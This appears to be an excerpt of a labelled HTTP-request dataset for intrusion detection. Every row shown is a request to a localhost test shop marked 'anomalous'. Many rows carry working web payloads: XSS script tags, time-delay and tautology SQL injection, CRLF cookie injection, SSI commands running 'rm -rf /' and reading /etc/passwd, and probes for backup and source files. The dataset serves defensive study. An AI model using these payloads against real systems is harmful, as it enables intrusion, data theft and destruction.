POST,http://localhost:8080/tienda1/publico/anadir.jsp,idA=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=27&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/homepage.nsf,,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=asbjorn&pwd=virulenta&remember=on&B1=Entrar%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=asbjorn&pwd=virulenta&remember=on&B1=Entrar%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=asbjorn&pwd=virulenta&remember=%3F&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=asbjorn&pwd=virulenta&remember=%3F&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=asbjorn&pwdA=virulenta&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=asbjorn&pwdA=virulenta&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080.bak,,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,idA=1,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%27OR%27a%3D%27a,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=%27OR%27a%3D%27a,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsgA=Credenciales+incorrectas,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp.Bak,,anomalous
GET,http://localhost:8080/samples/isapi/favlist.htm,,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5305&B1=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=5305&B1=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5305&B1=Confirmar%2F,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=5305&B1=Confirmar%2F,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=5305&B1=Pasar+por+caja,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precioA=5305&B1=Pasar+por+caja,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=shu-gong&password=5ar9ca&nombre=*Roc%EDo+*del+Vall*e&apellidos=Garayoa+Aguiar&email=mcquarrie%40cochesautomaticos.lc&dni=78013066X&direccion=Calle+Arquitecto+Monleon+112+&ciudad=Agallas&cp=08275&provincia=C%E1ceres&ntc=0341907708355896&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=shu-gong&password=5ar9ca&nombre=*Roc%EDo+*del+Vall*e&apellidos=Garayoa+Aguiar&email=mcquarrie%40cochesautomaticos.lc&dni=78013066X&direccion=Calle+Arquitecto+Monleon+112+&ciudad=Agallas&cp=08275&provincia=C%E1ceres&ntc=0341907708355896&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carritoany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=Vaciar+carritoany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2A=Vaciar+carrito,anomalous
GET,http://localhost:8080/tienda1/global/menum.jsp/6909030637832563290.jsp.OLD,,anomalous
GET,http://localhost:8080/tienda1/global/estilos.css.OLD,,anomalous
GET,http://localhost:8080/webapp/examples/HelloPervasive,,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=butcher&password=PanOso&nombre=Adelqui&apellidos=Riu+Riutort&email=wiren%40acch.mk&dni=92652474X&direccion=Carretera+Industrial%2C+60+&ciudad=Elduain&cp=26250&provincia=%C1vila%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&ntc=7730205532508885&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=butcher&password=PanOso&nombre=Adelqui&apellidos=Riu+Riutort&email=wiren%40acch.mk&dni=92652474X&direccion=Carretera+Industrial%2C+60+&ciudad=Elduain&cp=26250&provincia=%C1vila%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&ntc=7730205532508885&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=butcher&password=PanOso&nombre=Adelqui&apellidos=Riu+Riutort&email=tchoukov%40a_edols%40%40%40manuelpaloma.cy&dni=92652474X&direccion=Carretera+Industrial%2C+60+&ciudad=Elduain&cp=26250&provincia=%C1vila&ntc=7730205532508885&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=butcher&password=PanOso&nombre=Adelqui&apellidos=Riu+Riutort&email=tchoukov%40a_edols%40%40%40manuelpaloma.cy&dni=92652474X&direccion=Carretera+Industrial%2C+60+&ciudad=Elduain&cp=26250&provincia=%C1vila&ntc=7730205532508885&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=butcher&password=PanOso&nombre=Adelqui&apellidos=Riu+Riutort&email=wiren%40acch.mk&dni=92652474X&direccion=Carretera+Industrial%2C+60+&ciudad=Elduain&cp=26250&provincia=%C1vila&ntc=7730205532508885&B1A=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=butcher&password=PanOso&nombre=Adelqui&apellidos=Riu+Riutort&email=wiren%40acch.mk&dni=92652474X&direccion=Carretera+Industrial%2C+60+&ciudad=Elduain&cp=26250&provincia=%C1vila&ntc=7730205532508885&B1A=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/fotos.jsp.BAK,,anomalous
GET,http://localhost:8080/tienda1/.java,,anomalous
GET,http://localhost:8080/tienda1.inc,,anomalous
GET,http://localhost:8080/tienda1/imagenes/nuestratierra.jpg/.Inc,,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=85&cantidad=5&B1=A%F1adir+al+carrito%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombre=Queso+Manchego&precio=85&cantidad=5&B1=A%F1adir+al+carrito%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=1%2F&nombre=Queso+Manchego&precio=85&cantidad=5&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=1%2F&nombre=Queso+Manchego&precio=85&cantidad=5&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombreA=Queso+Manchego&precio=85&cantidad=5&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombreA=Queso+Manchego&precio=85&cantidad=5&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ovas%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&pwd=ric8Me6te&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=ovas%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&pwd=ric8Me6te&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&login=ovas&pwd=ric8Me6te&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&login=ovas&pwd=ric8Me6te&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=%27%2Cb%27rieda&pwd=ric8Me6te&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=%27%2Cb%27rieda&pwd=ric8Me6te&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&loginA=ovas&pwd=ric8Me6te&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&loginA=ovas&pwd=ric8Me6te&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp/4861362529278789730.inc,,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=2%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,idA=2,anomalous
GET,http://localhost:8080/tienda1/6909030637832563290.jsp,,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsgA=Credenciales+incorrectas,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3748&B1=Pasar+por+caja%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=3748&B1=Pasar+por+caja%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=%2B&B1=Pasar+por+caja,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=%2B&B1=Pasar+por+caja,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3748&B1=Confirmar%2F,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=3748&B1=Confirmar%2F,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=3748&B1=Pasar+por+caja,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modoA=insertar&precio=3748&B1=Pasar+por+caja,anomalous
GET,http://localhost:8080/,,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=puran&password=3inst9um6n90&nombre=Magno&apellidos=Viladric+Ylla&email=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727&dni=94584030A&direccion=Camino+De+Los+Girasoles%2C+138%2C+&ciudad=Navalmoralejo&cp=33402&provincia=Valladolid&ntc=0497803350257870&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=puran&password=3inst9um6n90&nombre=Magno&apellidos=Viladric+Ylla&email=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727&dni=94584030A&direccion=Camino+De+Los+Girasoles%2C+138%2C+&ciudad=Navalmoralejo&cp=33402&provincia=Valladolid&ntc=0497803350257870&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=puran&password=3inst9um6n90&nombre=Magno&apellidos=Viladric+Ylla&email=remeck2%40bru%F1oseguridad.aero&dni=94584030A&direccion=Camino+De+Los+Girasoles%2C+138%2C+&ciudad=Par%3Fadas&cp=33402&provincia=Valladolid&ntc=0497803350257870&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=puran&password=3inst9um6n90&nombre=Magno&apellidos=Viladric+Ylla&email=remeck2%40bru%F1oseguridad.aero&dni=94584030A&direccion=Camino+De+Los+Girasoles%2C+138%2C+&ciudad=Par%3Fadas&cp=33402&provincia=Valladolid&ntc=0497803350257870&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=puran&passwordA=3inst9um6n90&nombre=Magno&apellidos=Viladric+Ylla&email=remeck2%40bru%F1oseguridad.aero&dni=94584030A&direccion=Camino+De+Los+Girasoles%2C+138%2C+&ciudad=Navalmoralejo&cp=33402&provincia=Valladolid&ntc=0497803350257870&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=puran&passwordA=3inst9um6n90&nombre=Magno&apellidos=Viladric+Ylla&email=remeck2%40bru%F1oseguridad.aero&dni=94584030A&direccion=Camino+De+Los+Girasoles%2C+138%2C+&ciudad=Navalmoralejo&cp=33402&provincia=Valladolid&ntc=0497803350257870&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%252B,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=Vaciar+carrito%252B,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%22+AND+%221%22%3D%221,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=%22+AND+%221%22%3D%221,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2A=Vaciar+carrito,anomalous
GET,http://localhost:8080/tienda1~,,anomalous
GET,http://localhost:8080/tienda1/global/creditos.jsp/asf-logo-wide.gif,,anomalous
GET,http://localhost:8080/tienda1/global/menum.jsp/asf-logo-wide.gif,,anomalous
GET,http://localhost:8080/tienda1/global.bak,,anomalous
GET,http://localhost:8080/tienda1/global/estilos.css/asf-logo-wide.gif,,anomalous
GET,http://localhost:8080/tienda1/.INC,,anomalous
GET,http://localhost:8080/tienda1/asf-logo-wide.gif/,,anomalous
GET,http://localhost:8080/asf-logo-wide.gif.INC,,anomalous
GET,http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg/asf-logo-wide.gif/,,anomalous
GET,http://localhost:8080/tienda1/miembros/index.jsp/.OLD,,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ploeg&password=ganchoso&nombre=Arsacio&apellidos=To-nsma%3Fnn&email=merello%40psykoterapi.co&dni=47523526Y&direccion=C%2F+Miguel+Indurain%2C+23%2C+&ciudad=Granyena+de+les+Garrigues&cp=19392&provincia=Zamora&ntc=5291395031650627&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=ploeg&password=ganchoso&nombre=Arsacio&apellidos=To-nsma%3Fnn&email=merello%40psykoterapi.co&dni=47523526Y&direccion=C%2F+Miguel+Indurain%2C+23%2C+&ciudad=Granyena+de+les+Garrigues&cp=19392&provincia=Zamora&ntc=5291395031650627&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ploeg&password=ganchoso&nombre=Arsacio&apellidos=Veloso+Moncunil&email=merello%40psykoterapi.co&dniA=47523526Y&direccion=C%2F+Miguel+Indurain%2C+23%2C+&ciudad=Granyena+de+les+Garrigues&cp=19392&provincia=Zamora&ntc=5291395031650627&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=ploeg&password=ganchoso&nombre=Arsacio&apellidos=Veloso+Moncunil&email=merello%40psykoterapi.co&dniA=47523526Y&direccion=C%2F+Miguel+Indurain%2C+23%2C+&ciudad=Granyena+de+les+Garrigues&cp=19392&provincia=Zamora&ntc=5291395031650627&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1.java,,anomalous
GET,http://localhost:8080/tienda1/miembros/salir.jsp/6909030637832563290.jsp,,anomalous
GET,http://localhost:8080/tienda1/index.jsp/asf-logo-wide,,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+.*%3FRioja&precio=85&cantidad=42&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=1&nombre=Vino+.*%3FRioja&precio=85&cantidad=42&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=alyssa&pwd=ventr%F3n&remember=on&B1=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=alyssa&pwd=ventr%F3n&remember=on&B1=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=nean%2Bd%27er&pwd=ventr%F3n&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=nean%2Bd%27er&pwd=ventr%F3n&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=alyssa&pwd=ventr%F3n&rememberA=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=alyssa&pwd=ventr%F3n&rememberA=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=2any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,idA=2,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsgA=Credenciales+incorrectas,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp/asf-logo-wide.gif/,,anomalous
GET,http://localhost:8080/tienda1.bak,,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5022&B1=Confirmar%2F,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=5022&B1=Confirmar%2F,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5022&B1A=Confirmar,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=5022&B1A=Confirmar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=babbage&password=Lej%EDSimoS%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Higinia&apellidos=Arribas+Larrakoetxea&email=nichetti%40multireform.bf&dni=86111515K&direccion=Calle+Jesus+Martin+38%2C+&ciudad=Salillas&cp=48150&provincia=Barcelona&ntc=4618456072080141&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=babbage&password=Lej%EDSimoS%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Higinia&apellidos=Arribas+Larrakoetxea&email=nichetti%40multireform.bf&dni=86111515K&direccion=Calle+Jesus+Martin+38%2C+&ciudad=Salillas&cp=48150&provincia=Barcelona&ntc=4618456072080141&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=babbage&password=Lej%EDSimoS&nombre=Higinia&apellidos=Arribas+Larrakoetxea&email=nichetti%40multireform.bf&dni=86111515K&direccion=Cal%2Ble+La+Felipa+S%2B%2FN%2C*+12-B&ciudad=Salillas&cp=48150&provincia=Barcelona&ntc=4618456072080141&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=babbage&password=Lej%EDSimoS&nombre=Higinia&apellidos=Arribas+Larrakoetxea&email=nichetti%40multireform.bf&dni=86111515K&direccion=Cal%2Ble+La+Felipa+S%2B%2FN%2C*+12-B&ciudad=Salillas&cp=48150&provincia=Barcelona&ntc=4618456072080141&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=babbage&password=Lej%EDSimoS&nombre=Higinia&apellidos=Arribas+Larrakoetxea&email=nichetti%40multireform.bf&dni=86111515K&direccion=Calle+Jesus+Martin+38%2C+&ciudadA=Salillas&cp=48150&provincia=Barcelona&ntc=4618456072080141&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=babbage&password=Lej%EDSimoS&nombre=Higinia&apellidos=Arribas+Larrakoetxea&email=nichetti%40multireform.bf&dni=86111515K&direccion=Calle+Jesus+Martin+38%2C+&ciudadA=Salillas&cp=48150&provincia=Barcelona&ntc=4618456072080141&B1=Registrar,anomalous
GET,http://localhost:8080/IISSamples/sdk/asp/docs/libcodebrws.inc,,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2A=Vaciar+carrito,anomalous
GET,http://localhost:8080/tienda1/global/creditos.jsp/asf-logo-wide.gif.old,,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=delorme&password=terr%EDgena&nombre=Vladimir&apellidos=Basora+Bargall%F3&email=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&dni=40888726Q&direccion=Rio+Deva%2C+127%2C+13H&ciudad=Avinyonet+de+Puigvent%F3s&cp=25151&provincia=Salamanca&ntc=4881663630598066&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=delorme&password=terr%EDgena&nombre=Vladimir&apellidos=Basora+Bargall%F3&email=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&dni=40888726Q&direccion=Rio+Deva%2C+127%2C+13H&ciudad=Avinyonet+de+Puigvent%F3s&cp=25151&provincia=Salamanca&ntc=4881663630598066&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=delorme&password=terr%EDgena&nombre=Vladimir&apellidos=Basora+Bargall%F3&email=haynie%40sha%40mb%40alla-es.tel&dni=40888726Q&direccion=Rio+Deva%2C+127%2C+13H&ciudad=Avinyonet+de+Puigvent%F3s&cp=25151&provincia=Salamanca&ntc=4881663630598066&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=delorme&password=terr%EDgena&nombre=Vladimir&apellidos=Basora+Bargall%F3&email=haynie%40sha%40mb%40alla-es.tel&dni=40888726Q&direccion=Rio+Deva%2C+127%2C+13H&ciudad=Avinyonet+de+Puigvent%F3s&cp=25151&provincia=Salamanca&ntc=4881663630598066&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/imagenes/1.gif/4861362529278789730~,,anomalous
GET,http://localhost:8080/tienda1/imagenes/3.gif.BAK,,anomalous
GET,http://localhost:8080/tienda1/imagenes/logo.gif/asf-logo-wide.gif/,,anomalous
GET,http://localhost:8080/tienda1/4861362529278789730,,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=2%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&nombre=Queso+Manchego&precio=85&cantidad=9&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=2%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&nombre=Queso+Manchego&precio=85&cantidad=9&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Ques%2Bo+Manchego&precio=85&cantidad=9&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombre=Ques%2Bo+Manchego&precio=85&cantidad=9&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=85&cantidad=9&B1A=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombre=Queso+Manchego&precio=85&cantidad=9&B1A=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp/6909030637832563290.jsp,,anomalous
GET,http://localhost:8080/samples/sampsite/results.htm,,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&login=crowder&pwd=6.en0e6at2da&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&login=crowder&pwd=6.en0e6at2da&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=*bu%2Fntroc%2Fk4&pwd=6.en0e6at2da&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=*bu%2Fntroc%2Fk4&pwd=6.en0e6at2da&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&loginA=crowder&pwd=6.en0e6at2da&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&loginA=crowder&pwd=6.en0e6at2da&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,idA=1,anomalous
GET,http://localhost:8080/tienda1/publico.java,,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,,anomalous
